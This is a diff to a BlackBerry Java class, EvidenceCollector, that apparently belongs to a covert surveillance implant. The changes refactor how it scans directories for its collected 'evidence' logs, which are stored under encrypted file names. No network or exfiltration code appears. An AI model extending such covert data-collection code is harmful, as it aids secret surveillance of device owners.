@@ -16,6 +16,7 @@ import java.util.Vector;
 import javax.microedition.io.Connector;
 import javax.microedition.io.file.FileConnection;
 
+import net.rim.device.api.io.file.ExtendedFileConnection;
 import net.rim.device.api.system.PersistentObject;
 import net.rim.device.api.system.PersistentStore;
 import net.rim.device.api.system.RuntimeStore;
@@ -38,8 +39,7 @@ import blackberry.utils.StringSortVector;
  */
 public final class EvidenceCollector implements Singleton {
     //#ifdef DEBUG
-    private static Debug debug = new Debug("EvidenceColl",
-            DebugLevel.INFORMATION);
+    private static Debug debug = new Debug("EvidenceColl", DebugLevel.INFORMATION);
     //#endif
 
     static EvidenceCollector instance = null;
@@ -129,12 +129,13 @@ public final class EvidenceCollector implements Singleton {
 
     /**
      * Instantiates a new log collector.
-     * @throws Exception 
+     * 
+     * @throws Exception
      */
     private EvidenceCollector() {
-        super();        
+        super();
         logVector = new Vector();
-        
+
         keys = Encryption.getKeys();
     }
 
@@ -362,10 +363,11 @@ public final class EvidenceCollector implements Singleton {
         //#endif
 
         final StringSortVector vector = new StringSortVector();
-        FileConnection fc;
+        ExtendedFileConnection fc;
 
         try {
-            fc = (FileConnection) Connector.open("file://" + currentPath);
+            fc = (ExtendedFileConnection) Connector.open("file://"
+                    + currentPath);
 
             if (fc.isDirectory()) {
                 final Enumeration fileLogs = fc.list(Path.LOG_DIR_BASE + "*",
@@ -383,6 +385,10 @@ public final class EvidenceCollector implements Singleton {
                 }
 
                 vector.reSort();
+            } else {
+                //#ifdef DEBUG
+                debug.error("scanForDirLogs, not a directory: " + currentPath);
+                //#endif
             }
 
             fc.close();
@@ -422,40 +428,51 @@ public final class EvidenceCollector implements Singleton {
 
         final DoubleStringSortVector vector = new DoubleStringSortVector();
 
-        FileConnection fcDir = null;
+        ExtendedFileConnection fcDir = null;
         // FileConnection fcFile = null;
         try {
-            fcDir = (FileConnection) Connector.open("file://" + currentPath
-                    + dir);
+            fcDir = (ExtendedFileConnection) Connector.open("file://"
+                    + currentPath + dir);
 
-            final Enumeration fileLogs = fcDir.list("*", true);
+            if (fcDir.isDirectory()) {
 
-            while (fileLogs.hasMoreElements()) {
-                final String file = (String) fileLogs.nextElement();
+                //#ifdef DEBUG
+                debug.trace("scanForEvidences " + currentPath + dir + " size:" + fcDir.directorySize(false));
+                //#endif
+                final Enumeration fileLogs = fcDir.list("*", true);
 
-                // fcFile = (FileConnection) Connector.open(fcDir.getURL() +
-                // file);
-                // e' un file, vediamo se e' un file nostro
-                final String logMask = EvidenceCollector.LOG_EXTENSION;
-                final String encLogMask = encryptName(logMask);
+                while (fileLogs.hasMoreElements()) {
+                    final String file = (String) fileLogs.nextElement();
 
-                if (file.endsWith(encLogMask)) {
-                    // String encName = fcFile.getName();
-                    //#ifdef DEBUG
-                    debug.trace("enc name: " + file);
-                    //#endif
-                    final String plainName = decryptName(file);
-                    //#ifdef DEBUG
-                    debug.info("plain name: " + plainName);
-                    //#endif
+                    // fcFile = (FileConnection) Connector.open(fcDir.getURL() +
+                    // file);
+                    // e' un file, vediamo se e' un file nostro
+                    final String logMask = EvidenceCollector.LOG_EXTENSION;
+                    final String encLogMask = encryptName(logMask);
 
-                    vector.addElement(plainName, file);
+                    if (file.endsWith(encLogMask) || file.endsWith(encLogMask + ".rem")) {
+                        // String encName = fcFile.getName();
+                        //#ifdef DEBUG
+                        debug.trace("enc name: " + file);
+                        //#endif
+                        final String plainName = decryptName(file);
+                        //#ifdef DEBUG
+                        debug.info("plain name: " + plainName);
+                        //#endif
+
+                        vector.addElement(plainName, file);
+                    }
                 }
+            } else {
+                //#ifdef DEBUG                
+                debug.error("scanForEvidences, not a directory: " + currentPath
+                        + " / " + dir);
+                //#endif
             }
 
         } catch (final IOException e) {
             //#ifdef DEBUG
-            debug.error("scanForLogs: " + e);
+            debug.error("scanForEvidences: " + e);
             //#endif
 
         } finally {
@@ -471,7 +488,7 @@ public final class EvidenceCollector implements Singleton {
         }
 
         //#ifdef DEBUG
-        debug.trace("scanForLogs numDirs: " + vector.size());
+        debug.trace("scanForEvidences numDirs: " + vector.size());
 
         //#endif
         return vector.getValues();
